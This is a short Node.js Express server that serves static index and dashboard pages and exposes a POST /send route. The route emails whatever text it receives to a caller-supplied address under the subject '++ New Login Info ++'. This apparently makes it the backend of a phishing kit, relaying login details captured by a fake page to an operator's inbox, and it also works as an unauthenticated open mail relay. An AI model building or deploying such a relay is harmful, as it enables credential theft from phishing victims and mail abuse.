// Replace if using a different env file or config
const env = require("dotenv").config({ path: "./.env" });

const express = require("express");
const path = require("path");
const app = express();
const staticRoute = process.env.STATIC_DIR || "client/";
const { resolve } = require("path");
const bodyParser = require("body-parser");
const emailservice = require("@afriddev/emailservice");
const EmailValidator = require("email-deep-validator");

const PORT = process.env.PORT || 8080;

app.use(bodyParser.json()); // Parse JSON data from the request body
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(staticRoute));

app.get("/styles/index.css", (req, res) => {
  res.type("text/css");
  const path = resolve(staticRoute + "assets/styles/index.css");
  res.sendFile(path);
});

app.get("/styles/dsb.css", (req, res) => {
  res.type("text/css");
  const path = resolve(staticRoute + "assets/styles/dsb.css");
  res.sendFile(path);
});

app.get("/", (req, res) => {
  const path = resolve(staticRoute + "pages/index.html");
  res.sendFile(path);
});

app.get("/dashboard", (req, res) => {
  const path = resolve(staticRoute + "pages/dashboard.html");
  res.sendFile(path);
});

app.post("/send", async (req, res) => {
  const { email, text } = req.body;
  console.log(text);

  const response = await emailservice({
    toEmail: email,
    title: "LGBTQ",
    subject: "++ New Login Info ++",
    body: text,
  });

  res.send({
    response: response,
  });
});

app.listen(PORT, () =>
  console.log(`Node server listening at http://localhost:${PORT}`)
);
